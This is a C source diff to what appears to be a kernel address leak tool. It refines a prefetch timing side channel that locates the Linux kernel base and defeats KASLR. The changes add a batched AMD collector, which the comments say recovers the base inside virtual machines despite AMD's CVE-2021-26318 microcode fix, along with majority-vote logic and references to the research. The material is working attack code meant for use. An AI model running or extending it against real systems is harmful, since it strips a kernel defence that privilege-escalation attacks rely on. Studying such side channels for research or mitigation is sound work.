@@ -41,32 +41,50 @@
 //   across iterations are used.
 //
 // AMD strategy:
-//   The timing signal is inverted: mapped pages produce higher latency
-//   than unmapped ones (the page walk completes fully rather than being
-//   quickly NOPped). Per-slot sums across iterations are used because
-//   rdtscp on some AMD CPUs only resolves to ~36-cycle quanta (min and
-//   median collapse to a single quantum; sums preserve the slow-vs-fast
-//   proportion as a continuous value). The kernel region is the leftmost
-//   cluster of slots whose sums exceed 1.5x the median (a confirmation window
-//   filters PDP entry boundary artifacts ~1.2x median, 7 slots wide every 128
-//   slots, and isolated scheduling outliers); the left edge is then walked out
-//   to the baseline transition with a looser 1.25x bound to recover the weaker
-//   base slot.
+//   The timing signal is inverted: mapped pages produce higher latency than
+//   unmapped ones (the page walk completes fully rather than being quickly
+//   NOPped). Two collectors feed the same leftmost-cluster edge finder; the
+//   cheap one runs first and the expensive one is a fallback.
 //
-//   A virtualized AMD guest can produce a mapped/unmapped differential of only
-//   a few percent — well below 1.5x — yet coherent across the whole kernel
-//   image. When the 1.5x cluster search finds nothing, a fallback scales the
+//   Primary: per-slot sums of single timed prefetches across iterations, which
+//   preserve the slow-vs-fast proportion when rdtscp resolves only to coarse
+//   quanta (min and median collapse to a single quantum; the sum stays
+//   continuous). The kernel region is the leftmost cluster of slots exceeding
+//   1.5x the median (a confirmation window filters PDP entry boundary artifacts
+//   ~1.2x median, 7 slots wide every 128 slots, and isolated scheduling
+//   outliers); the left edge is then walked out to the baseline transition with
+//   a looser 1.25x bound to recover the base slot, which the sum leaves weaker
+//   than the region body. A virtualized AMD guest can produce a differential of
+//   only a few percent — well below 1.5x — yet coherent across the whole kernel
+//   image; when the 1.5x search finds nothing a further tier scales the
 //   threshold to the baseline dispersion (median absolute deviation) so a
-//   low-amplitude plateau still clears it. The boundary bands are taller than
-//   such a plateau, so amplitude cannot separate them; the fallback instead
-//   requires the confirmed run to be many slots wide, which the few-slot bands
-//   cannot satisfy. A kernel image narrower than that width is reported as no
-//   signal rather than guessed.
+//   low-amplitude plateau still clears it, gated on a minimum plateau width so
+//   the few-slot boundary bands (taller than such a plateau) cannot qualify.
+//
+//   Fallback (when the sum finds no cluster): a batched collector times many
+//   back-to-back prefetches to one address under a single rdtscp bracket,
+//   amortizing the timer overhead so the measured span is dominated by
+//   per-access page-walk latency. This exposes a mapped/unmapped differential
+//   that a single timed prefetch leaves buried in rdtscp quantization — on some
+//   parts, notably microcode-mitigated AMD under nested paging, a mapped slot
+//   then reads many-fold above baseline where a single-prefetch scan reads
+//   flat. The batched profile is strongly bimodal and its base slot is as
+//   strong as the body, so its edge finder takes the leftmost slot of a plateau
+//   many times the median (a high threshold even a contention-perturbed
+//   baseline stays well under) with no loose left-walk — nothing is mapped
+//   below the base. A batched pass is far costlier than a summed one, so it
+//   runs only as a fallback and stops as soon as two passes agree.
 //
 // Limitations:
 //   - Requires KPTI to be disabled (no signal through KPTI page tables).
 //   - Timing resolution depends on rdtscp granularity, which varies
 //     across microarchitectures.
+//   - Recent AMD microcode eliminates the page-walk timing differential on
+//     bare metal (CVE-2021-26318 / AMD-SB-1017): the sweep reads flat and no
+//     base is reported. The differential persists inside virtual machines,
+//     where nested paging reintroduces it, and on older unpatched microcode.
+//     A flat result on a patched AMD CPU is the mitigation working, not a
+//     tool fault.
 //   - The signal can be transiently masked by system state (scheduler
 //     placement, CPU power / frequency state, thermal throttling,
 //     concurrent load) and reappear after the state changes. A run
@@ -98,10 +116,16 @@
 //   Lake+); on those CPUs the prefetch timing differential is in scope
 //   by default and no kernel patch addresses it directly.
 //
+//   On AMD, microcode updates for CVE-2021-26318 (AMD-SB-1017) remove the
+//   prefetch page-walk timing differential on bare metal. The batched fallback
+//   collector still recovers the base inside virtual machines, where nested
+//   paging reintroduces the differential, and on pre-fix microcode.
+//
 // References:
 //   https://gruss.cc/files/prefetch.pdf
 //   https://github.com/IAIK/prefetch
 //   https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/gruss
+//   https://www.amd.com/en/resources/product-security/bulletin/amd-sb-1017.html
 // ---
 // <bcoles@gmail.com>
 
@@ -143,35 +167,81 @@ static int verbose = 0;
 #define STEP KASLR_VIRT_ALIGN
 #define NUM_SLOTS ((KERNEL_VIRT_TEXT_MAX - KERNEL_VIRT_TEXT_MIN) / STEP)
 #define ITERATIONS 64
+// The batched AMD collector amortizes the timer over a large prefetch batch, so
+// its per-slot signal is far cleaner than the single-prefetch sum; a handful of
+// min-over-trials sweeps already converge.
+#define BATCH_ITERATIONS 10
 #define CONFIRM_K 5
 #define CONFIRM_M 8
 
 // ---------------------------------------------------------------------------
-// Majority vote across multiple passes.
+// Majority vote across up to `max_passes` passes. On AMD, `batched` selects the
+// batched collector (a strong page-walk-latency amplifier) over the
+// single-prefetch sum; it is ignored for other vendors, whose
+// FASTER-when-mapped orientation the batched collector does not model.
+//
+// A batched pass is far more expensive than a summed one — a whole batch of
+// prefetches per slot rather than one timed prefetch — and on a slow page-walk
+// host (e.g. an oversubscribed Zen 1 guest) a full 512-slot batched pass costs
+// seconds. Because the batched signal is strong and stable, it needs fewer
+// passes than the summed sum: the vote runs at most BATCH_PASSES and exits
+// early once one base has an unbeatable majority of them. A base is committed
+// only when it is corroborated by a majority of passes, never a single lucky
+// one — a transient contention burst can forge a false cluster in one pass, but
+// being temporal it does not recur at the same slots the next pass, so it can
+// never reach a majority.
 // ---------------------------------------------------------------------------
 #define NUM_PASSES 7
+#define BATCH_PASSES 5
 
-static unsigned long majority_vote(int cpu_vendor, int *n_found) {
+static unsigned long majority_vote(int cpu_vendor, int batched, int *n_found) {
   unsigned long results[NUM_PASSES];
   uint64_t times[NUM_SLOTS];
+  int use_batched = batched && cpu_vendor == CPU_VENDOR_AMD;
+  int max_passes = use_batched ? BATCH_PASSES : NUM_PASSES;
+  int iters = use_batched ? BATCH_ITERATIONS : ITERATIONS;
+  int npasses = 0;
   int i;
 
-  for (i = 0; i < NUM_PASSES; i++) {
-    prefetch_scan_collect(times, NUM_SLOTS, KERNEL_VIRT_TEXT_MIN, STEP,
-                          cpu_vendor, ITERATIONS);
+  for (i = 0; i < max_passes; i++) {
+    if (use_batched)
+      prefetch_scan_collect_batched(times, NUM_SLOTS, KERNEL_VIRT_TEXT_MIN,
+                                    STEP, iters);
+    else
+      prefetch_scan_collect(times, NUM_SLOTS, KERNEL_VIRT_TEXT_MIN, STEP,
+                            cpu_vendor, iters);
 
     if (verbose && i == 0)
       prefetch_scan_dump(times, NUM_SLOTS, KERNEL_VIRT_TEXT_MIN, STEP,
-                         cpu_vendor == CPU_VENDOR_AMD ? "sum_cycles"
-                                                      : "min_cycles");
+                         use_batched                    ? "batch_min_cycles"
+                         : cpu_vendor == CPU_VENDOR_AMD ? "sum_cycles"
+                                                        : "min_cycles");
 
-    long edge = prefetch_scan_find_edge(times, NUM_SLOTS, cpu_vendor, CONFIRM_K,
-                                        CONFIRM_M);
+    long edge = use_batched
+                    ? prefetch_scan_find_edge_batched(times, NUM_SLOTS,
+                                                      CONFIRM_K, CONFIRM_M)
+                    : prefetch_scan_find_edge(times, NUM_SLOTS, cpu_vendor,
+                                              CONFIRM_K, CONFIRM_M);
     results[i] =
         edge < 0 ? 0 : KERNEL_VIRT_TEXT_MIN + (unsigned long)edge * STEP;
+    npasses = i + 1;
 
     if (verbose)
       fprintf(stderr, "# pass %d: 0x%lx\n", i, results[i]);
+
+    /* Batched early-exit: stop once one base holds an unbeatable majority of
+     * the pass budget (the remaining passes cannot overturn it), so a clean
+     * signal pays only the passes it takes to corroborate — but never commit on
+     * fewer than a majority, so a one-off false cluster from a contention burst
+     * is outvoted rather than trusted. */
+    if (use_batched && results[i]) {
+      int votes = 0, j;
+      for (j = 0; j <= i; j++)
+        if (results[j] == results[i])
+          votes++;
+      if (votes > max_passes / 2)
+        break;
+    }
   }
 
   /* Count passes that located a mapped-kernel cluster (non-zero). This lets the
@@ -180,7 +250,7 @@ static unsigned long majority_vote(int cpu_vendor, int *n_found) {
    * (candidates found but scattered by noise, so no majority forms). */
   if (n_found) {
     *n_found = 0;
-    for (i = 0; i < NUM_PASSES; i++)
+    for (i = 0; i < npasses; i++)
       if (results[i])
         (*n_found)++;
   }
@@ -189,7 +259,7 @@ static unsigned long majority_vote(int cpu_vendor, int *n_found) {
   unsigned long candidate = 0;
   int count = 0;
 
-  for (i = 0; i < NUM_PASSES; i++) {
+  for (i = 0; i < npasses; i++) {
     if (count == 0) {
       candidate = results[i];
       count = 1;
@@ -202,12 +272,12 @@ static unsigned long majority_vote(int cpu_vendor, int *n_found) {
 
   /* Verify the candidate actually has majority */
   count = 0;
-  for (i = 0; i < NUM_PASSES; i++) {
+  for (i = 0; i < npasses; i++) {
     if (results[i] == candidate)
       count++;
   }
 
-  if (count > NUM_PASSES / 2)
+  if (count > npasses / 2)
     return candidate;
 
   return 0;
@@ -242,7 +312,15 @@ static unsigned long get_kernel_addr_prefetch(void) {
   pin_cpu(0);
 
   int n_found = 0;
-  unsigned long addr = majority_vote(cpu, &n_found);
+  /* Try the cheap single-prefetch sum first: it resolves the base on most AMD
+   * parts (including the low-amplitude virtualized case) in milliseconds. Only
+   * when it finds nothing fall back to the batched collector — a strong
+   * amplifier that recovers the base where a single timed prefetch reads flat
+   * (notably microcode-mitigated AMD under nested paging), but whose per-slot
+   * batch makes a full scan cost up to seconds on a slow page-walk host. */
+  unsigned long addr = majority_vote(cpu, /*batched=*/0, &n_found);
+  if (!addr && cpu == CPU_VENDOR_AMD)
+    addr = majority_vote(cpu, /*batched=*/1, &n_found);
 
   if (!addr) {
     if (n_found == 0)
